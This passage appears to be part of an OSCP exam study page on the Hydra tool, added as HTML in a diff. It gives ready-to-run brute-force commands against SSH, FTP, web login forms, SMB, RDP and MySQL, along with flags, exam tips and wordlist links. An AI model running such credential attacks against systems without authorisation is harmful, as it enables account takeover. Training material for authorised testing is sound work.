+</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>custom.txt<span class="w"> </span>target<span class="w"> </span>ssh
+</span></code></pre></div>
+<hr />
+<h2 id="quick-reference">Quick Reference</h2>
+<h3 id="essential-commands">Essential Commands</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># SSH</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ssh://IP
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1"># FTP</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>ftp://IP
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1"># HTTP POST</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>IP<span class="w"> </span>http-post-form<span class="w"> </span><span class="s2">&quot;/path:user=^USER^&amp;pass=^PASS^:F=fail&quot;</span>
+</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>
+</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1"># HTTP GET</span>
+</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>IP<span class="w"> </span>http-get-form<span class="w"> </span><span class="s2">&quot;/path?user=^USER^&amp;pass=^PASS^:F=fail&quot;</span>
+</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>
+</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="c1"># HTTP Basic Auth</span>
+</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>IP<span class="w"> </span>http-get<span class="w"> </span>/path/
+</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a>
+</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="c1"># SMB</span>
+</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://IP
+</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a>
+</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a><span class="c1"># RDP</span>
+</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>rdp://IP
+</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a>
+</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#__codelineno-50-22"></a><span class="c1"># MySQL</span>
+</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#__codelineno-50-23"></a>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>mysql://IP
+</span></code></pre></div>
+<h3 id="common-flags">Common Flags</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>-l<span class="w"> </span>LOGIN<span class="w">      </span><span class="c1"># Single username</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>-L<span class="w"> </span>FILE<span class="w">       </span><span class="c1"># Username list</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>-p<span class="w"> </span>PASS<span class="w">       </span><span class="c1"># Single password</span>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>-P<span class="w"> </span>FILE<span class="w">       </span><span class="c1"># Password list</span>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>-C<span class="w"> </span>FILE<span class="w">       </span><span class="c1"># Combo user:pass file</span>
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>-t<span class="w"> </span>TASKS<span class="w">      </span><span class="c1"># Parallel tasks</span>
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>-f<span class="w">            </span><span class="c1"># Stop when found</span>
+</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>-V<span class="w">            </span><span class="c1"># Very verbose</span>
+</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>-o<span class="w"> </span>FILE<span class="w">       </span><span class="c1"># Output to file</span>
+</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>-s<span class="w"> </span>PORT<span class="w">       </span><span class="c1"># Custom port</span>
+</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>-w<span class="w"> </span>TIMEOUT<span class="w">    </span><span class="c1"># Response timeout</span>
+</span></code></pre></div>
+<hr />
+<h2 id="pro-tips">Pro Tips</h2>
+<div class="admonition tip">
+<p class="admonition-title">OSCP Exam Tips</p>
+<ul>
+<li><strong>Always start with common/default credentials</strong></li>
+<li><strong>Use small wordlists first</strong> (top-100, top-1000)</li>
+<li><strong>Capture login request with Burp</strong> to get exact parameters</li>
+<li><strong>Test your Hydra command</strong> with known credentials first</li>
+<li><strong>Use <code>-f</code> flag</strong> to stop after first success</li>
+<li><strong>Document successful credentials</strong> immediately</li>
+<li><strong>Be patient</strong> - some services are rate-limited</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Web Attack Tips</p>
+<ul>
+<li><strong>Inspect failed login</strong> to find unique error text</li>
+<li><strong>Check for CSRF tokens</strong> (may prevent brute force)</li>
+<li><strong>Look for cookies</strong> required for authentication</li>
+<li><strong>Test with cURL first</strong> to understand the response</li>
+<li><strong>Use Burp Suite</strong> to capture exact POST data</li>
+<li><strong>Check HTTP response codes</strong> (200, 302, 403, etc.)</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common Mistakes</p>
+<ul>
+<li>Not URL-encoding special characters in parameters</li>
+<li>Using wrong protocol (http vs https)</li>
+<li>Incorrect failure/success string</li>
+<li>Missing required headers or cookies</li>
+<li>Too many parallel tasks causing lockouts</li>
+<li>Not testing with known valid credentials first</li>
+</ul>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">OSCP Restrictions</p>
+<ul>
+<li><strong>Don't DoS the target</strong> - use reasonable thread counts</li>
+<li><strong>Document your methodology</strong> for the report</li>
+<li><strong>Note successful credentials</strong> with timestamps</li>
+<li><strong>Be mindful of account lockouts</strong> on Active Directory</li>
+</ul>
+</div>
+<hr />
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra GitHub</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists Wordlists</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">OSCP Wordlists Guide</a></li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<h3 id="most-common-oscp-commands">Most Common OSCP Commands</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># 1. SSH brute force</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>hydra<span class="w"> </span>-l<span class="w"> </span>root<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>ssh://192.168.1.100
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="c1"># 2. Web login form</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="w">  </span>http-post-form<span class="w"> </span><span class="s2">&quot;/login:username=^USER^&amp;password=^PASS^:F=Invalid&quot;</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="c1"># 3. FTP default credentials</span>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>hydra<span class="w"> </span>-C<span class="w"> </span>/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="w">  </span>ftp://192.168.1.100
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="c1"># 4. SMB brute force</span>
+</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>hydra<span class="w"> </span>-l<span class="w"> </span>administrator<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>smb://192.168.1.100
+</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>
+</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="c1"># 5. HTTP Basic Auth</span>
+</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span>-P<span class="w"> </span>passwords.txt<span class="w"> </span>http-get://192.168.1.100/admin/
+</span></code></pre></div>
+<h3 id="remember">Remember</h3>
+<ol>
+<li><strong>Capture the request</strong> with Burp Suite first</li>
+<li><strong>Test with known credentials</strong> to verify syntax</li>
+<li><strong>Start with small wordlists</strong> for quick wins</li>
+<li><strong>Use <code>-f</code> flag</strong> to stop after first match</li>
+<li><strong>Document everything</strong> for your report</li>
+</ol>
 
 
 
